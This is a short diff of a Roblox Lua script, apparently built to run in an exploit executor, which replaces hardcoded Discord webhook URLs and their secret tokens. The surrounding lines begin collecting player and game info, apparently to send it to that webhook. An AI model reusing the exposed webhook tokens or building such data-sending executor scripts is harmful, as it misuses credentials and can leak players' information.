@@ -406,7 +406,7 @@ local function IBVD_fake_script() -- WebButton.LocalScript
 
 	-- LocalScript unter deinem TextButton  ─  by Skyonix
 	-----------------------------------------------------
-	local WEBHOOK_URL = "hhttps://discordapp.com/api/webhooks/1390376490176352266/if5JhA6_VCVYOwfjakSXrhbpUzYk1BzkS_OJTkkiaqljQQhDikcaT-SgHfE-8sTedM99"
+	local WEBHOOK_URL = "https://discordapp.com/api/webhooks/1390677103694844006/lZp0-N44Z9yBjb7aioFKA9p32Ubjl65E1HJqIFF5wWCmwa-PzOVKbZkFwYiJmPdCKce2"
 	
 	-- Skyonix Discord Webhook Sender (für Executor)
 	local HttpService = game:GetService("HttpService")
@@ -419,7 +419,7 @@ local function IBVD_fake_script() -- WebButton.LocalScript
 	end
 	
 	-- Deine Webhook-URL hier eintragen
-	local WEBHOOK_URL = "https://discordapp.com/api/webhooks/1390376490176352266/if5JhA6_VCVYOwfjakSXrhbpUzYk1BzkS_OJTkkiaqljQQhDikcaT-SgHfE-8sTedM99"
+	local WEBHOOK_URL = "https://discordapp.com/api/webhooks/1390677103694844006/lZp0-N44Z9yBjb7aioFKA9p32Ubjl65E1HJqIFF5wWCmwa-PzOVKbZkFwYiJmPdCKce2"
 	
 	-- Spieler- und Spielinfo holen
 	local player = game.Players.LocalPlayer
